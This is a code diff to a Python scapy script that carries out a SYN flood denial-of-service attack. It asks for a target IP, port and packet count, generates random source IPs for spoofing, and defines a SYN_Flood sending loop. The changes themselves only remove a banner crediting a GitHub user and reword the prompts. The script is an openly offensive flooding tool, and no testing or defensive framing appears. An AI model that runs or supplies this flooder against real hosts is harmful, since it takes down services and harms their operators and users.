@@ -4,16 +4,9 @@ from scapy.all import *
 from random import randint
 import os
 
-os.system("clear")
-print ("#####################################")
-print ("#        github.com/ParzivalHack    #")
-print ("#####################################")
-print ("############## Welcome ##############")
-print ("#####################################")
-
-dstIP = str(raw_input("Target IP : "))
-dstPort = int(input("Target Port : "))
-counter = input("How many packets do you want to send : ")
+dstIP = str(raw_input("Target IP: "))
+dstPort = int(input("Target Port: "))
+counter = input("Packets to send: ")
 
 def randomIP():
 	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
@@ -27,7 +20,7 @@ def randInt():
 
 def SYN_Flood(dstIP,dstPort,counter):
 	total = 0
-	print ("Packets are sending ...")
+	print ("Sending packets...")
 
 	for x in range (0,counter):
 		s_port = randInt()
